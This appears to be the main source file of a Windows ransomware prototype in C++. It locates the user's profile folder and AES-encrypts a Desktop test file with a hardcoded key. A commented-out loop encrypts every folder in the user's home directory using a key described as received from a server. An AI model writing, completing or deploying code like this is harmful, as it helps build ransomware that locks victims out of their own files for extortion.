#include "encrypt.h"
#include <shlobj.h>

int main() {
    // Hardcoded AES key and IV (for demonstration purposes, you should use secure methods to store and manage keys)
    const BYTE key[AES_BLOCK_SIZE] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x97, 0x7f, 0x3c, 0x59, 0x5c, 0xb1 };
    const BYTE iv[AES_BLOCK_SIZE] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

    char userProfileDir[MAX_PATH];

    // Get the path to the user's profile folder
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userProfileDir))) {
        // Print the user's profile folder path
        std::cout << "User's profile folder: " << userProfileDir << std::endl;
    } else {
        // Failed to get the user's profile folder path
        std::cerr << "Failed to get user's profile folder." << std::endl;
    }
    // ------------------------------------------------ //

    // Get all folder names within the user's home directory
    //std::vector<std::wstring> folderNames = getFolderNames((wstring)userProfileDir);

    // Construct the full path to the input file
    char inputFile[MAX_PATH];
    snprintf(inputFile, MAX_PATH, "%s\\Desktop\\test.txt", userProfileDir);

    // Encrypt test file
    printf("Encrypting file...\n");
    encryptFile(inputFile, key, iv);
    printf("Encryption complete.\n");

    // Encrypt folders within each user's home directory
    /*
    for (const auto& folderName : folderNames) {
        // Construct the folder path
        std::wstring folderPath = userProfileDir;
        folderPath += L"\\" + folderName;

        // Use the decryption key received from the server
        const BYTE* decryptionKeyArray = decryptionKey.data();
        const DWORD keySize = static_cast<DWORD>(decryptionKey.size());

        if (encryptFolder(folderPath, decryptionKeyArray, keySize)) {
            std::wcout << L"Folder '" << folderName << L"' encrypted successfully." << std::endl;
        } else {
            std::wcerr << L"Failed to encrypt folder '" << folderName << L"'." << std::endl;
        }
    }
    */

    getchar();
    return 0;
}
